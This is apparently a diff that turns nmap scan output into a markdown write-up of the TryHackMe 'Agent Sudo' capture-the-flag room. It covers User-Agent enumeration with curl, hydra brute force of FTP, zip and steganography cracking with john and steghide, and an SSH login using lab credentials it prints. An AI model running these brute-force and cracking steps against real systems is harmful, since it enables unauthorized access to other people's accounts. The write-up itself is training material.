@@ -1,21 +1,347 @@
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
-|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
-|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
+# CTF Writeup — Agent Sudo (TryHackMe)
 
+  
 
-|_http-title: Annoucement
-Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.14 - 6.8 (95%), Linux 4.15 - 5.19 (95%), Linux 4.15 (94%), Linux 3.11 - 3.14 (92%), Linux 3.7 - 4.19 (92%), Ruckus ZoneFlex R710 WAP (Linux 3.4) (92%), Linux 3.10 (92%), Linux 3.2 - 4.14 (92%), Linux 3.8 - 3.16 (92%)
-No exact OS matches for host (test conditions non-ideal).
-Uptime guess: 28.209 days (since Wed Apr 15 03:57:15 2026)
-Network Distance: 3 hops
-TCP Sequence Prediction: Difficulty=258 (Good luck!)
-IP ID Sequence Generation: All zeros
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+## Overview
+
+Multi-step CTF involving web enumeration, custom HTTP headers, FTP brute force, steganography, and SSH access.
+
+  
+
+**Services found:**
+
+- Port 21 — FTP (vsftpd 3.0.3)
+
+- Port 22 — SSH (OpenSSH 7.6p1)
+
+- Port 80 — HTTP (Apache 2.4.29)
+
+  
+
+---
+
+  
+
+## Step 1 — Nmap
+
+  
+
+```bash
+
+nmap -sV -sC <IP>
+
+```
+
+  
+
+---
+
+  
+
+## Step 2 — Web Enumeration (Port 80)
+
+  
+
+Visited the site. Page source said:
+
+> "Use your own **codename** as user-agent to access the site. — Agent R"
+
+  
+
+Brute forced all single letters A–Z as User-Agent headers to find which agent's page responds differently:
+
+  
+
+```bash
+
+default=$(curl -sL -A "default" http://<IP>)
+
+  
+
+for letter in {A..Z}; do
+
+    response=$(curl -sL -A "$letter" http://<IP>)
+
+    if [ "$response" != "$default" ]; then
+
+        echo "=== DIFFERENT RESPONSE for: $letter ==="
+
+        echo "$response"
+
+    fi
+
+done
+
+```
+
+  
+
+**Result:** Agent `C` revealed a message exposing:
+
+- Username: `chris`
+
+- Hint: password is weak
+
+  
+
+---
+
+  
+
+## Step 3 — FTP Brute Force
+
+  
+
+Used hydra to brute force FTP with the discovered username:
+
+  
+
+```bash
+
+hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<IP>
+
+```
+
+  
+
+Logged in and downloaded all files:
+
+  
+
+```bash
+
+ftp <IP>
+
+# login: chris / <cracked password>
+
+ls
+
+get <filename>
+
+```
+
+  
+
+Files found on FTP:
+
+- `cutie.png`
+
+- `cute-alien.jpg`
+
+- `To_AgentJ.txt` (or similar)
+
+  
+
+---
+
+  
+
+## Step 4 — Steganography on cutie.png
+
+  
+
+### Binwalk — extract hidden files
+
+  
+
+```bash
+
+binwalk -e cutie.png
+
+# Creates folder: _cutie.png.extracted/
+
+```
+
+  
+
+Found a zip inside: `8702.zip`
+
+  
+
+### Crack the zip password
+
+  
+
+```bash
+
+zip2john _cutie.png.extracted/8702.zip > zip.hash
+
+john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+```
+
+  
+
+**Password found:** `alien`
+
+  
+
+### Extract the zip
+
+  
+
+```bash
+
+cd _cutie.png.extracted/
+
+7z x 8702.zip -palien
+
+cat To_agentR.txt
+
+```
+
+  
+
+Message contained a Base64 string: `QXJlYTUx`
+
+  
+
+### Decode Base64
+
+  
+
+```bash
+
+echo "QXJlYTUx" | base64 -d
+
+# Output: Area51
+
+```
+
+  
+
+---
+
+  
+
+## Step 5 — Steganography on cute-alien.jpg
+
+  
+
+Used `steghide` with the decoded passphrase:
+
+  
+
+```bash
+
+steghide extract -sf cute-alien.jpg
+
+# Passphrase: Area51
+
+```
+
+  
+
+Extracted file revealed:
+
+- Username: `james`
+
+- Password: `hackerrules!`
+
+  
+
+---
+
+  
+
+## Step 6 — SSH Access
+
+  
+
+```bash
+
+ssh james@<IP>
+
+# Password: hackerrules!
+
+  
+
+ls
+
+cat user.txt   # user flag
+
+```
+
+  
+
+### Download files from SSH
+
+  
+
+```bash
+
+scp james@<IP>:Alien_autospy.jpg .
+
+```
+
+  
+
+---
+
+  
+
+## Tools Used
+
+  
+
+| Tool | Purpose |
+
+|------|---------|
+
+| `nmap` | Port scanning |
+
+| `curl -A` | Custom User-Agent requests |
+
+| `hydra` | FTP brute force |
+
+| `binwalk` | Extract hidden files from images |
+
+| `zip2john` + `john` | Crack zip password |
+
+| `7z` | Extract encrypted zip/7z |
+
+| `steghide` | Extract hidden data from jpg |
+
+| `base64` | Decode encoded strings |
+
+| `scp` | Download files over SSH |
+
+  
+
+---
+
+  
+
+## Key Lessons
+
+  
+
+- Always check HTTP response changes when fuzzing headers, not just page content
+
+- `binwalk -e` is the easiest way to extract hidden files from images
+
+- Base64 strings in CTFs almost always decode to passwords or locations
+
+- "Weak password" hint = run rockyou.txt with hydra
+
+- Steghide needs a passphrase — look for it in other files/clues
+
+- Follow the chain: web → FTP → stego → SSH
+
+  
+
+---
+
+  
+
+## Credentials Found
+
+  
+
+| Service | Username | Password |
+
+|---------|----------|----------|
+
+| FTP | chris | *(cracked by hydra)* |
+
+| SSH | james | hackerrules! |
